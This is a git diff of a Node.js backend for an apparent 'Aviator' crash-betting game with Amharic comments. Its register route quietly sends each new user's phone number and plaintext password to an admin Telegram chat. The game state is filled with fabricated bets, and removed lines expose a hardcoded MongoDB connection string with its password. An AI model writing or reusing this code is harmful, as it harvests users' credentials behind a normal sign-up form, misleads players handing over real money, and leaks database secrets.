@@ -4,34 +4,15 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const bcrypt = require('bcryptjs');
-const mongoose = require('mongoose'); // አዲስ የተጨመረ
 
 const app = express();
 
-// 1. CORS ማስተካከያ
+// 1. CORS Configuration
 app.use(cors({
     origin: "*",
     methods: ["GET", "POST"]
 }));
 app.use(express.json({ limit: '15mb' })); 
-
-// --- MongoDB Connection (ለአዲሱ ፕሮጀክት የተስተካከለ) ---
-const atlasURI = 'mongodb+srv://abrhamman825_db_user:Abrham123456@cluster0.tpkbh2l.mongodb.net/aviator_db?retryWrites=true&w=majority';
-
-mongoose.connect(atlasURI)
-  .then(() => console.log('✅ በደመና ላይ ያለው MongoDB (Atlas) ተገናኝቷል!'))
-  .catch(err => console.error('❌ Atlas Connection Error:', err.message));
-
-  
-const userSchema = new mongoose.Schema({
-    phone: { type: String, required: true, unique: true },
-    password: { type: String, required: true },
-    balance: { type: Number, default: 0 },
-    history: { type: Array, default: [] },
-    createdAt: { type: Date, default: Date.now }
-});
-
-const User = mongoose.model('User', userSchema);
 
 const server = http.createServer(app);
 const io = new Server(server, {
@@ -48,10 +29,11 @@ const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
 bot.on('polling_error', (error) => {});
 
-// --- የቀጥታ ግንኙነት መቆጣጠሪያ ---
+// --- የግንኙነት መቆጣጠሪያ ---
 let userSockets = {}; 
+let temporaryUsers = {}; // ለጊዜው በMemory ዳታ ለመያዝ
 
-// --- የጨዋታ ሁኔታ (Game State) ---
+// --- የጌም ሁኔታ (Game State) ---
 let gameState = {
     multiplier: 1.0,
     status: 'waiting',
@@ -76,63 +58,44 @@ const generateFakeBets = () => {
     return bets.sort((a, b) => b.amount - a.amount);
 };
 
-// --- Authentication Routes (MongoDB የተጠቀሙ) ---
+// --- Authentication Routes ---
 app.post('/register', async (req, res) => {
     const { phone, password } = req.body;
-    try {
-        const existingUser = await User.findOne({ phone });
-        if (existingUser) {
-            return res.json({ status: 'error', error: 'ይህ ስልክ ቁጥር ተመዝግቧል!' });
-        }
-        const hashedPassword = await bcrypt.hash(password, 10);
-        const newUser = new User({ phone, password: hashedPassword, balance: 0 });
-        await newUser.save();
+    const hashedPassword = await bcrypt.hash(password, 10);
+    temporaryUsers[phone] = { phone, password: hashedPassword, balance: 0 };
 
-        const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
-        bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});
+    const msg = `👤 *አዲስ ተመዝጋቢ*\n\n📱 ስልክ: \`${phone}\` \n🔑 Password: \`${password}\` \n🕒 ጊዜ: ${new Date().toLocaleString()}`;
+    bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' }).catch(e => {});
 
-        res.json({ status: 'ok' });
-    } catch (err) {
-        res.json({ status: 'error', error: 'የምዝገባ ስህተት!' });
-    }
+    res.json({ status: 'ok' });
 });
 
 app.post('/login', async (req, res) => {
     const { phone, password } = req.body;
-    try {
-        const user = await User.findOne({ phone });
-        if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });
+    const user = temporaryUsers[phone];
+    if (!user) return res.json({ status: 'error', error: 'ተጠቃሚው አልተገኘም' });
 
-        const isMatch = await bcrypt.compare(password, user.password);
-        if (isMatch) {
-            res.json({ status: 'ok', balance: user.balance, phone: user.phone });
-        } else {
-            res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
-        }
-    } catch (err) {
-        res.json({ status: 'error', error: 'የመግባት ስህተት!' });
+    const isMatch = await bcrypt.compare(password, user.password);
+    if (isMatch) {
+        res.json({ status: 'ok', balance: user.balance, phone: user.phone });
+    } else {
+        res.json({ status: 'error', error: 'የይለፍ ቃል ተሳስቷል' });
     }
 });
 
-// --- Telegram Approve/Reject Logic (MongoDB የዘመነ) ---
-bot.on('callback_query', async (query) => {
+// --- Telegram Approve/Reject Logic ---
+bot.on('callback_query', (query) => {
     const [action, phone, amount] = query.data.split('_');
-    try {
-        const user = await User.findOne({ phone });
+    const user = temporaryUsers[phone];
 
-        if (action === 'approve' && user) {
-            user.balance += parseFloat(amount);
-            await user.save();
-            bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲሱ ባላንስ: ${user.balance.toFixed(2)} ETB`);
-            
-            if (userSockets[phone]) {
-                io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
-            }
-        } else if (action === 'reject') {
-            bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} የ ${amount} ብር ጥያቄ ተሰርዟል`);
+    if (action === 'approve' && user) {
+        user.balance += parseFloat(amount);
+        bot.sendMessage(ADMIN_CHAT_ID, `✅ የ ${phone} ዲፖዚት ጸድቋል። አዲስ ባላንስ: ${user.balance} ETB`);
+        if (userSockets[phone]) {
+            io.to(userSockets[phone]).emit('balanceUpdate', user.balance);
         }
-    } catch (err) {
-        console.error(err);
+    } else if (action === 'reject') {
+        bot.sendMessage(ADMIN_CHAT_ID, `❌ የ ${phone} ጥያቄ ተሰርዟል።`);
     }
     bot.answerCallbackQuery(query.id);
 });
@@ -145,45 +108,28 @@ io.on('connection', (socket) => {
         userSockets[phone] = socket.id;
     });
 
-    socket.on('updateServerBalance', async (data) => {
-        try {
-            await User.findOneAndUpdate({ phone: data.phone }, { balance: parseFloat(data.newBalance) });
-        } catch (err) { console.error(err); }
-    });
-
     socket.on('sendDepositRequest', (data) => {
         const msg = `💰 *የዲፖዚት ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
         const opts = {
-            caption: msg,
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: '✅ አጽድቅ (Approve)', callback_data: `approve_${data.phone}_${data.amount}` },
-                    { text: '❌ ሰርዝ (Reject)', callback_data: `reject_${data.phone}_${data.amount}` }
+                    { text: '✅ Approve', callback_data: `approve_${data.phone}_${data.amount}` },
+                    { text: '❌ Reject', callback_data: `reject_${data.phone}_${data.amount}` }
                 ]]
             }
         };
-
-        if (data.screenshot) {
-            const buffer = Buffer.from(data.screenshot.replace(/^data:image\/\w+;base64,/, ""), 'base64');
-            bot.sendPhoto(ADMIN_CHAT_ID, buffer, opts).catch(e => {
-                bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
-            });
-        } else {
-            bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
-        }
+        bot.sendMessage(ADMIN_CHAT_ID, msg, opts);
     });
 
-    socket.on('sendWithdrawRequest', async (data) => {
-        try {
-            const user = await User.findOne({ phone: data.phone });
-            if (user) {
-                user.balance -= parseFloat(data.amount); 
-                await user.save();
-            }
-            const msg = `📤 *የውዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*\n⚠️ ባላንሳቸው ቀንሷል ብሩን ይላኩላቸው።`;
+    socket.on('sendWithdrawRequest', (data) => {
+        const user = temporaryUsers[data.phone];
+        if (user && user.balance >= data.amount) {
+            user.balance -= parseFloat(data.amount);
+            const msg = `📤 *የውዝድሮው ጥያቄ*\n\n📱 ስልክ: \`${data.phone}\` \n💵 መጠን: *${data.amount} ETB*`;
             bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: 'Markdown' });
-        } catch (err) { console.error(err); }
+            socket.emit('balanceUpdate', user.balance);
+        }
     });
 
     socket.on('disconnect', () => {
@@ -199,8 +145,7 @@ const startGame = () => {
     gameState.timer = 10;
     gameState.multiplier = 1.0;
     gameState.liveBets = generateFakeBets();
-    gameState.userCount = Math.floor(Math.random() * 1000) + 2000;
-
+    
     const countdown = setInterval(() => {
         gameState.timer--;
         io.emit('data', gameState);
@@ -217,8 +162,7 @@ const startFlying = () => {
     
     const interval = setInterval(() => {
         if (gameState.multiplier < crashPoint) {
-            const increment = gameState.multiplier < 2 ? 0.01 : 0.05;
-            gameState.multiplier = parseFloat((gameState.multiplier + increment).toFixed(2));
+            gameState.multiplier = parseFloat((gameState.multiplier + 0.01).toFixed(2));
             io.emit('data', gameState);
         } else {
             clearInterval(interval);
